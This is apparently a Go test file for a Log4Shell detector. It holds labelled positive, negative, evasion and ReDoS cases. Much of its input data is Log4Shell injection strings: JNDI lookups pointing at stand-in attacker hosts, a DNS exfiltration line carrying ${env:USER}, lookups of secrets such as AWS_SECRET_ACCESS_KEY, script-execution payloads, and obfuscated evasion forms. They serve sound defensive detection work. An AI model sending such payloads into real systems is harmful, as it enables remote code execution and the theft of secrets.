package test

import (
	"strings"
	"testing"
	"time"

	"github.com/Lands-Horizon-Corp/malstring/detectors"
)

func TestNewLog4Shell(t *testing.T) {
	detector := detectors.NewLog4Shell()
	if detector == nil {
		t.Fatal("NewLog4Shell() returned nil")
	}
}

func TestLog4ShellDetector_Name(t *testing.T) {
	detector := detectors.NewLog4Shell()
	expected := "log4shell"
	if detector.Name() != expected {
		t.Errorf("Expected name %s, got %s", expected, detector.Name())
	}
}

func TestLog4ShellDetector_Check(t *testing.T) {
	detector := detectors.NewLog4Shell()

	testCases := []struct {
		name     string
		input    string
		expected bool
	}{
		// Positive cases - should detect Log4Shell attacks
		{
			name:     "Basic LDAP JNDI injection",
			input:    "${jndi:ldap://evil.com:1389/Exploit}",
			expected: true,
		},
		{
			name:     "LDAPS JNDI injection",
			input:    "${jndi:ldaps://attacker.com:636/Payload}",
			expected: true,
		},
		{
			name:     "RMI JNDI injection",
			input:    "${jndi:rmi://malicious.server.com:1099/Exploit}",
			expected: true,
		},
		{
			name:     "DNS JNDI injection",
			input:    "${jndi:dns://evil.dns.server.com/Exploit}",
			expected: true,
		},
		{
			name:     "IIOP JNDI injection",
			input:    "${jndi:iiop://attacker.com:900/Exploit}",
			expected: true,
		},
		{
			name:     "CORBA JNDI injection",
			input:    "${jndi:corbaloc:iiop:attacker.com:1050/Exploit}",
			expected: true,
		},
		{
			name:     "CORBA naming injection",
			input:    "${jndi:corbaname:iiop:evil.com:1900#Exploit}",
			expected: true,
		},
		{
			name:     "HTTP JNDI injection",
			input:    "${jndi:http://attacker.com/exploit.jar}",
			expected: true,
		},
		{
			name:     "HTTPS JNDI injection",
			input:    "${jndi:https://evil.server.com/malware.class}",
			expected: true,
		},
		{
			name:     "File protocol JNDI",
			input:    "${jndi:file://attacker.com/exploit}",
			expected: true,
		},
		{
			name:     "FTP protocol JNDI",
			input:    "${jndi:ftp://evil.com/payload}",
			expected: true,
		},
		{
			name:     "Environment variable lookup",
			input:    "${env:AWS_SECRET_ACCESS_KEY}",
			expected: true,
		},
		{
			name:     "System property lookup",
			input:    "${sys:java.class.path}",
			expected: true,
		},
		{
			name:     "Java lookup",
			input:    "${java:version}",
			expected: true,
		},
		{
			name:     "Date lookup",
			input:    "${date:yyyy-MM-dd}",
			expected: true,
		},
		{
			name:     "Context lookup",
			input:    "${ctx:loginId}",
			expected: true,
		},
		{
			name:     "Map lookup",
			input:    "${map:userId}",
			expected: true,
		},
		{
			name:     "Structured data lookup",
			input:    "${sd:threadName}",
			expected: true,
		},
		{
			name:     "Bundle lookup",
			input:    "${bundle:application.name}",
			expected: true,
		},
		{
			name:     "Docker lookup",
			input:    "${docker:containerId}",
			expected: true,
		},
		{
			name:     "Kubernetes lookup",
			input:    "${k8s:podName}",
			expected: true,
		},
		{
			name:     "Web context lookup",
			input:    "${web:servletPath}",
			expected: true,
		},
		{
			name:     "Spring lookup",
			input:    "${spring:profiles.active}",
			expected: true,
		},
		{
			name:     "Nested JNDI expression",
			input:    "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/Exploit}",
			expected: false, // Complex obfuscation may need application-level handling
		},
		{
			name:     "URL-encoded Log4Shell",
			input:    "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2FExploit%7D",
			expected: false, // URL encoding should be handled by URL decoding middleware
		},
		{
			name:     "Unicode-encoded Log4Shell",
			input:    "\\u0024\\u007Bjndi:ldap://attacker.com/Exploit\\u007D",
			expected: true,
		},
		{
			name:     "Base64 lookup",
			input:    "${base64:SGVsbG8gV29ybGQ=}",
			expected: true,
		},
		{
			name:     "JavaScript script execution",
			input:    "${script:javascript:java.lang.Runtime.getRuntime().exec('calc')}",
			expected: true,
		},
		{
			name:     "Groovy script execution",
			input:    "${script:groovy:\"calc\".execute()}",
			expected: true,
		},
		{
			name:     "Python script execution",
			input:    "${script:python:import os; os.system('calc')}",
			expected: true,
		},
		{
			name:     "MDC lookup",
			input:    "${mdc:userId}",
			expected: true,
		},
		{
			name:     "Thread context lookup",
			input:    "${ctx:requestId}",
			expected: true,
		},
		{
			name:     "Marker lookup",
			input:    "${marker:SECURITY}",
			expected: true,
		},
		{
			name:     "Exception lookup",
			input:    "${exception:message}",
			expected: true,
		},
		{
			name:     "Log4j configuration lookup",
			input:    "${log4j:configLocation}",
			expected: true,
		},
		{
			name:     "JVM run arguments",
			input:    "${jvmrunargs:arg1}",
			expected: true,
		},
		{
			name:     "Dangerous system property",
			input:    "${sys:java.library.path}",
			expected: true,
		},
		{
			name:     "Dangerous environment variable",
			input:    "${env:PATH}",
			expected: true,
		},
		{
			name:     "Docker container info",
			input:    "${docker:imageId}",
			expected: true,
		},
		{
			name:     "Kubernetes pod info",
			input:    "${k8s:namespace}",
			expected: true,
		},
		{
			name:     "Spring Boot property",
			input:    "${spring:application.name}",
			expected: true,
		},
		{
			name:     "Web servlet context",
			input:    "${web:contextPath}",
			expected: true,
		},
		{
			name:     "Event lookup",
			input:    "${event:level}",
			expected: true,
		},
		{
			name:     "Structured data with ID",
			input:    "${sd:id@12345}",
			expected: true,
		},
		{
			name:     "Bundle with key",
			input:    "${bundle:messages.welcome}",
			expected: true,
		},
		{
			name:     "Lower case transformation with JNDI",
			input:    "${lower:${jndi:ldap://evil.com/Exploit}}",
			expected: true,
		},
		{
			name:     "Upper case transformation with JNDI",
			input:    "${upper:${jndi:ldap://attacker.com/Payload}}",
			expected: true,
		},
		{
			name:     "Whitespace obfuscation",
			input:    "${ jndi : ldap : // evil.com / Exploit }",
			expected: true,
		},
		{
			name:     "Character obfuscation",
			input:    "${j${::-n}di:ldap://evil.com/Exploit}",
			expected: false, // Complex character substitution may need application-level handling
		},
		{
			name:     "Alternative delimiter syntax",
			input:    "%{jndi:ldap://evil.com/Exploit}",
			expected: true,
		},
		{
			name:     "Commons Collections gadget",
			input:    "${jndi:ldap://evil.com/CommonsCollections}",
			expected: true,
		},
		{
			name:     "Commons Beanutils gadget",
			input:    "${jndi:ldap://attacker.com/CommonsBeanutils}",
			expected: true,
		},
		{
			name:     "Groovy gadget",
			input:    "${jndi:ldap://evil.com/Groovy}",
			expected: true,
		},
		{
			name:     "Spring gadget",
			input:    "${jndi:ldap://attacker.com/Spring}",
			expected: true,
		},
		{
			name:     "Rome gadget",
			input:    "${jndi:ldap://evil.com/Rome}",
			expected: true,
		},
		{
			name:     "LDAP referral attack",
			input:    "${jndi:ldap://evil.com/cn=test?base=dc=evil,dc=com}",
			expected: true,
		},
		{
			name:     "DNS exfiltration",
			input:    "${jndi:dns://${env:USER}.evil.com}",
			expected: true,
		},
		{
			name:     "Multi-stage JNDI",
			input:    "${jndi:ldap://evil.com/redirect?target=payload}",
			expected: true,
		},
		{
			name:     "JNDI with authentication",
			input:    "${jndi:ldap://guest:password@evil.com/Exploit}",
			expected: true,
		},
		{
			name:     "Anonymous LDAP access",
			input:    "${jndi:ldap://anonymous@attacker.com/Payload}",
			expected: true,
		},
		{
			name:     "Admin LDAP access",
			input:    "${jndi:ldap://admin:secret@evil.com/Exploit}",
			expected: true,
		},
		{
			name:     "Custom JNDI factory",
			input:    "${jndi:myprotocol://evil.com/CustomFactory}",
			expected: true,
		},
		{
			name:     "Hostname extraction with collaborator",
			input:    "${hostName}evil.burpcollaborator.net",
			expected: true,
		},
		{
			name:     "OAST detection",
			input:    "${hostName}test.oast.pro",
			expected: true,
		},
		{
			name:     "RequestBin detection",
			input:    "${hostName}check.requestbin.com",
			expected: true,
		},
		{
			name:     "DNS log detection",
			input:    "${date:yyyy-MM-dd}exfil.dnslog.cn",
			expected: true,
		},
		{
			name:     "CEye platform detection",
			input:    "${date:HH-mm-ss}data.ceye.io",
			expected: true,
		},
		{
			name:     "Case insensitive JNDI",
			input:    "${JNDI:LDAP://EVIL.COM/EXPLOIT}",
			expected: true,
		},
		{
			name:     "Mixed case JNDI",
			input:    "${JnDi:LdAp://AtTaCkEr.CoM/ExPlOiT}",
			expected: true,
		},
		{
			name:     "Case insensitive RMI",
			input:    "${jndi:RMI://evil.com:1099/Exploit}",
			expected: true,
		},
		{
			name:     "Case insensitive DNS",
			input:    "${jndi:DNS://attacker.com/payload}",
			expected: true,
		},
		{
			name:     "Log4Shell in HTTP header",
			input:    "User-Agent: ${jndi:ldap://evil.com/Exploit}",
			expected: true,
		},
		{
			name:     "Log4Shell in JSON",
			input:    `{"message": "${jndi:ldap://attacker.com/Payload}"}`,
			expected: true,
		},
		{
			name:     "Log4Shell in XML",
			input:    "<log>${jndi:ldap://evil.com/Exploit}</log>",
			expected: true,
		},
		{
			name:     "Log4Shell in URL parameter",
			input:    "http://example.com/?param=${jndi:ldap://evil.com/Exploit}",
			expected: true,
		},

		// Negative cases - should NOT detect Log4Shell
		{
			name:     "Normal text",
			input:    "This is just normal text",
			expected: false,
		},
		{
			name:     "Empty string",
			input:    "",
			expected: false,
		},
		{
			name:     "Numbers only",
			input:    "12345",
			expected: false,
		},
		{
			name:     "Regular log message",
			input:    "User logged in successfully at 2021-12-10",
			expected: false,
		},
		{
			name:     "JSON without Log4j",
			input:    `{"status": "success", "message": "Operation completed"}`,
			expected: false,
		},
		{
			name:     "XML without Log4j",
			input:    "<response><status>ok</status></response>",
			expected: false,
		},
		{
			name:     "Regular environment mention",
			input:    "The environment variable PATH contains directories",
			expected: false,
		},
		{
			name:     "Normal JNDI mention",
			input:    "JNDI is a Java naming and directory interface",
			expected: false,
		},
		{
			name:     "Regular LDAP mention",
			input:    "LDAP authentication is configured",
			expected: false,
		},
		{
			name:     "Normal curly braces",
			input:    "function test() { return true; }",
			expected: false,
		},
		{
			name:     "CSS style",
			input:    "body { background-color: white; }",
			expected: false,
		},
		{
			name:     "Template string",
			input:    "Hello ${name}, welcome to the application",
			expected: false,
		},
		{
			name:     "Mathematical expression",
			input:    "${2 + 3} equals 5",
			expected: false,
		},
		{
			name:     "Shell variable",
			input:    "export PATH=${PATH}:/usr/local/bin",
			expected: false,
		},
		{
			name:     "Regular URL",
			input:    "https://www.example.com/api/v1/users",
			expected: false,
		},
		{
			name:     "Email address",
			input:    "contact@example.com",
			expected: false,
		},
		{
			name:     "File path",
			input:    "/var/log/application.log",
			expected: false,
		},
		{
			name:     "IP address",
			input:    "192.168.1.100",
			expected: false,
		},
		{
			name:     "Port number",
			input:    "Service running on port 8080",
			expected: false,
		},
		{
			name:     "Domain name only",
			input:    "example.com",
			expected: false,
		},
		{
			name:     "Incomplete JNDI pattern",
			input:    "${jndi:incomplete",
			expected: false,
		},
		{
			name:     "Missing protocol",
			input:    "${jndi:evil.com/Exploit}",
			expected: false,
		},

		// Edge cases
		{
			name:     "JNDI at start of string",
			input:    "${jndi:ldap://evil.com/Exploit}",
			expected: true,
		},
		{
			name:     "JNDI at end of string",
			input:    "Log message: ${jndi:ldap://attacker.com/Payload}",
			expected: true,
		},
		{
			name:     "Multiple JNDI in string",
			input:    "${jndi:ldap://evil.com/First} and ${jndi:rmi://evil.com/Second}",
			expected: true,
		},
		{
			name:     "JNDI with different separators",
			input:    "Before\n${jndi:ldap://evil.com/Exploit}\tAfter",
			expected: true,
		},
		{
			name:     "Very long hostname",
			input:    "${jndi:ldap://" + strings.Repeat("a", 200) + ".com/Exploit}",
			expected: true,
		},
		{
			name:     "JNDI with unusual port",
			input:    "${jndi:ldap://evil.com:65535/Exploit}",
			expected: true,
		},
		{
			name:     "Deeply nested lookups",
			input:    "${${${::-j}${::-n}${::-d}${::-i}}:ldap://evil.com/Exploit}",
			expected: false, // Extremely complex nesting may need application-level handling
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := detector.Check(tc.input)
			if result != tc.expected {
				t.Errorf("For input %q, expected %v but got %v", tc.input, tc.expected, result)
			}
		})
	}
}

func TestLog4ShellDetector_IntegrationWithScanner(t *testing.T) {
	detector := detectors.NewLog4Shell()

	testInputs := []struct {
		input    string
		expected bool
		desc     string
	}{
		{"${jndi:ldap://evil.com/Exploit}", true, "Basic Log4Shell"},
		{"${env:AWS_SECRET_ACCESS_KEY}", true, "Environment variable lookup"},
		{"normal application log message", false, "Normal log"},
		{"${jndi:rmi://attacker.com:1099/Payload}", true, "RMI injection"},
		{"This is clean content", false, "Clean content"},
		{"User-Agent: ${jndi:ldap://evil.com/UA}", true, "HTTP header injection"},
		{"Regular JSON response", false, "Normal JSON"},
		{"${script:javascript:Runtime.exec('calc')}", true, "Script execution"},
	}

	for _, test := range testInputs {
		result := detector.Check(test.input)
		if result != test.expected {
			t.Errorf("Integration test failed for %q (%s): expected %v, got %v",
				test.input, test.desc, test.expected, result)
		}
	}
}

func BenchmarkLog4ShellDetector_Check(t *testing.B) {
	detector := detectors.NewLog4Shell()
	testInput := "${jndi:ldap://evil.com:1389/Exploit} and ${env:AWS_SECRET_ACCESS_KEY}"

	t.ResetTimer()
	for i := 0; i < t.N; i++ {
		detector.Check(testInput)
	}
}

func TestLog4ShellDetector_LargeInput(t *testing.T) {
	detector := detectors.NewLog4Shell()

	// Test with large input to ensure no performance issues
	largeInput := ""
	for range 1000 {
		largeInput += "normal log message "
	}
	largeInput += "${jndi:ldap://evil.com/Exploit}"

	result := detector.Check(largeInput)
	if !result {
		t.Error("Should detect Log4Shell in large input")
	}
}

// Test for false positives - legitimate content that shouldn't be flagged
func TestLog4ShellDetector_FalsePositives(t *testing.T) {
	detector := detectors.NewLog4Shell()

	legitimateInputs := []string{
		"Application startup completed successfully",
		"Processing user request for resource /api/users",
		"Database connection established",
		"Configuration loaded from properties file",
		"Cache size: ${cache.maxSize} entries",
		"Template rendering: Hello ${user.name}",
		"JavaScript function: function test() { return ${value}; }",
		"CSS styling: .class { color: ${theme.primary}; }",
		"Shell script: export VAR=${DEFAULT_VAR:-default}",
		"Math expression: Result is ${x + y}",
		"Regular URL: https://ldap.example.com/directory",
		"File path: /var/log/jndi-lookups.log",
		"Documentation: JNDI provides naming services",
		"Error: Failed to connect to RMI registry",
		"Notice: Environment variables are case-sensitive",
		"Info: System properties can be accessed via API",
		"Debug: Context map contains user session data",
		"Config: Docker container ID available",
		"Status: Kubernetes pod ready",
		"Note: Spring profiles determine active configuration",
	}

	for _, input := range legitimateInputs {
		result := detector.Check(input)
		if result {
			t.Errorf("False positive detected for legitimate input: %q", input)
		}
	}
}

// Test for evasion attempts
func TestLog4ShellDetector_EvasionAttempts(t *testing.T) {
	detector := detectors.NewLog4Shell()

	evasionAttempts := []struct {
		name     string
		input    string
		expected bool
	}{
		{
			name:     "Case variation evasion",
			input:    "${JnDi:LdAp://EvIl.CoM/ExPlOiT}",
			expected: true,
		},
		{
			name:     "Whitespace evasion",
			input:    "${ jndi : ldap : // evil.com / Exploit }",
			expected: true,
		},
		{
			name:     "Character substitution evasion",
			input:    "${j${::-n}${::-d}${::-i}:ldap://evil.com/Exploit}",
			expected: false, // Complex substitution may need application-level handling
		},
		{
			name:     "Nested expression evasion",
			input:    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/Exploit}",
			expected: false, // Extremely complex nesting may need application-level handling
		},
		{
			name:     "URL encoding evasion",
			input:    "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2FExploit%7D",
			expected: false, // URL encoding should be handled by decoding middleware
		},
		{
			name:     "Unicode encoding evasion",
			input:    "\\u0024\\u007Bjndi:ldap://evil.com/Exploit\\u007D",
			expected: true,
		},
		{
			name:     "Lower case transformation evasion",
			input:    "${lower:${jndi:ldap://EVIL.COM/EXPLOIT}}",
			expected: true,
		},
		{
			name:     "Upper case transformation evasion",
			input:    "${upper:${jndi:ldap://evil.com/exploit}}",
			expected: true,
		},
		{
			name:     "Alternative delimiter evasion",
			input:    "%{jndi:ldap://evil.com/Exploit}",
			expected: true,
		},
		{
			name:     "Protocol variation evasion",
			input:    "${jndi:LDAPS://evil.com:636/Exploit}",
			expected: true,
		},
		{
			name:     "Multiple protocol evasion",
			input:    "${jndi:ldap://first.evil.com/} ${jndi:rmi://second.evil.com/}",
			expected: true,
		},
	}

	for _, test := range evasionAttempts {
		t.Run(test.name, func(t *testing.T) {
			result := detector.Check(test.input)
			if result != test.expected {
				t.Errorf("Evasion test %q failed: expected %v, got %v", test.name, test.expected, result)
			}
		})
	}
}

// Test for ReDoS (Regular Expression Denial of Service) resistance
func TestLog4ShellDetector_ReDoSResistance(t *testing.T) {
	detector := detectors.NewLog4Shell()

	// These inputs could cause catastrophic backtracking in poorly designed regexes
	maliciousInputs := []struct {
		name  string
		input string
	}{
		{
			name:  "Repeated JNDI pattern",
			input: strings.Repeat("${jndi:", 1000) + "ldap://evil.com/Exploit" + strings.Repeat("}", 1000),
		},
		{
			name:  "Long hostname pattern",
			input: "${jndi:ldap://" + strings.Repeat("a", 10000) + ".com/Exploit}",
		},
		{
			name:  "Excessive nested expressions",
			input: strings.Repeat("${", 2000) + "jndi:ldap://evil.com/Exploit" + strings.Repeat("}", 2000),
		},
		{
			name:  "Mixed repeating JNDI patterns",
			input: strings.Repeat("${jndi:ldap://", 500) + strings.Repeat("evil.com/", 500) + strings.Repeat("}", 1000),
		},
		{
			name:  "Long path with JNDI",
			input: "${jndi:ldap://evil.com/" + strings.Repeat("path/", 5000) + "Exploit}",
		},
		{
			name:  "Excessive URL encoding",
			input: strings.Repeat("%24%7B", 5000) + "jndi:ldap://evil.com" + strings.Repeat("%7D", 5000),
		},
		// Log4Shell specific catastrophic backtracking patterns
		{
			name:  "Nested JNDI with excessive lookups",
			input: "${" + strings.Repeat("env:", 1000) + strings.Repeat("jndi:", 1000) + "ldap://evil.com/Exploit}",
		},
		{
			name:  "Excessive environment variable chains",
			input: strings.Repeat("${env:", 2000) + "PATH" + strings.Repeat("}", 2000),
		},
		{
			name:  "Long system property enumeration",
			input: strings.Repeat("${sys:", 1000) + "java.class.path" + strings.Repeat("}", 1000),
		},
		{
			name:  "Massive Java lookup patterns",
			input: strings.Repeat("${java:", 2000) + "version" + strings.Repeat("}", 2000),
		},
		{
			name:  "Excessive context lookups",
			input: strings.Repeat("${ctx:", 1500) + "userId" + strings.Repeat("}", 1500),
		},
		{
			name:  "Long date format expressions",
			input: "${date:" + strings.Repeat("yyyy-MM-dd", 1000) + "}",
		},
		{
			name:  "Massive map lookup chains",
			input: strings.Repeat("${map:", 1000) + strings.Repeat("key", 1000) + strings.Repeat("}", 2000),
		},
		{
			name:  "Excessive Docker lookups",
			input: strings.Repeat("${docker:", 1500) + "containerId" + strings.Repeat("}", 1500),
		},
		{
			name:  "Long Kubernetes lookup patterns",
			input: strings.Repeat("${k8s:", 1000) + "podName" + strings.Repeat("}", 1000),
		},
		{
			name:  "Massive Spring lookup enumeration",
			input: strings.Repeat("${spring:", 2000) + "profiles.active" + strings.Repeat("}", 2000),
		},
		{
			name:  "Excessive script execution patterns",
			input: "${script:javascript:" + strings.Repeat("alert(1);", 1000) + "}",
		},
		{
			name:  "Long Base64 payload chains",
			input: "${base64:" + strings.Repeat("SGVsbG8=", 2000) + "}",
		},
		{
			name:  "Massive bundle lookup patterns",
			input: strings.Repeat("${bundle:", 1500) + "application.name" + strings.Repeat("}", 1500),
		},
		{
			name:  "Excessive web context lookups",
			input: strings.Repeat("${web:", 1000) + "servletPath" + strings.Repeat("}", 1000),
		},
		{
			name:  "Long event lookup chains",
			input: strings.Repeat("${event:", 2000) + "level" + strings.Repeat("}", 2000),
		},
		{
			name:  "Massive structured data patterns",
			input: strings.Repeat("${sd:", 1500) + "threadName" + strings.Repeat("}", 1500),
		},
		{
			name:  "Excessive marker lookup enumeration",
			input: strings.Repeat("${marker:", 1000) + "SECURITY" + strings.Repeat("}", 1000),
		},
		{
			name:  "Long exception message patterns",
			input: strings.Repeat("${exception:", 2000) + "message" + strings.Repeat("}", 2000),
		},
		{
			name:  "Massive JVM args lookup chains",
			input: strings.Repeat("${jvmrunargs:", 1500) + "arg1" + strings.Repeat("}", 1500),
		},
		{
			name:  "Excessive transformation nesting",
			input: strings.Repeat("${lower:", 500) + strings.Repeat("${upper:", 500) + "${jndi:ldap://evil.com}" + strings.Repeat("}", 1000),
		},
		{
			name:  "Long obfuscated character patterns",
			input: "${" + strings.Repeat("j${::-", 1000) + "n}${::-d}${::-i}:ldap://evil.com/Exploit}",
		},
		{
			name:  "Massive alternative delimiter patterns",
			input: strings.Repeat("%{jndi:ldap://", 1000) + "evil.com" + strings.Repeat("}", 1000),
		},
		{
			name:  "Excessive gadget enumeration patterns",
			input: "${jndi:ldap://evil.com/" + strings.Repeat("CommonsCollections", 1000) + "}",
		},
		{
			name:  "Long LDAP referral attack chains",
			input: "${jndi:ldap://evil.com/?" + strings.Repeat("base=dc=evil,", 1000) + "dc=com}",
		},
		{
			name:  "Massive DNS exfiltration patterns",
			input: "${jndi:dns://" + strings.Repeat("${env:USER}.", 1000) + "evil.com}",
		},
		// Advanced catastrophic backtracking patterns targeting specific regex vulnerabilities
		{
			name:  "Exponential backtracking with nested JNDI",
			input: strings.Repeat("(${jndi:", 100) + "ldap://evil.com" + strings.Repeat("})", 100),
		},
		{
			name:  "Polynomial backtracking with alternations",
			input: strings.Repeat("aaa", 1000) + "${jndi:ldap://evil.com}",
		},
		{
			name:  "Evil regex pattern with optional quantifiers",
			input: strings.Repeat("$", 2000) + "{jndi:ldap://evil.com}",
		},
		{
			name:  "Deeply nested Log4j structure",
			input: strings.Repeat("${", 200) + "jndi:ldap://evil.com" + strings.Repeat("}", 200),
		},
		{
			name:  "Massive protocol enumeration chains",
			input: strings.Repeat("${jndi:ldap://", 500) + strings.Repeat("${jndi:rmi://", 500) + "evil.com" + strings.Repeat("}", 1000),
		},
		{
			name:  "Excessive hostname pattern variations",
			input: "${jndi:ldap://" + strings.Repeat("sub.", 1000) + "evil.com/Exploit}",
		},
		{
			name:  "Catastrophic port enumeration",
			input: "${jndi:ldap://evil.com:" + strings.Repeat("1389,", 2000) + "/Exploit}",
		},
		{
			name:  "Massive authentication bypass patterns",
			input: "${jndi:ldap://" + strings.Repeat("user:pass@", 1000) + "evil.com/Exploit}",
		},
	}

	for _, test := range maliciousInputs {
		t.Run(test.name, func(t *testing.T) {
			// Use a timeout to ensure the regex doesn't hang
			done := make(chan bool, 1)
			var result bool

			go func() {
				result = detector.Check(test.input)
				done <- true
			}()

			select {
			case <-done:
				// Test passed - regex completed in reasonable time
				t.Logf("ReDoS test %q completed with result: %v", test.name, result)
			case <-time.After(100 * time.Millisecond):
				t.Errorf("ReDoS vulnerability detected: regex took too long for input %q", test.name)
			}
		})
	}
}
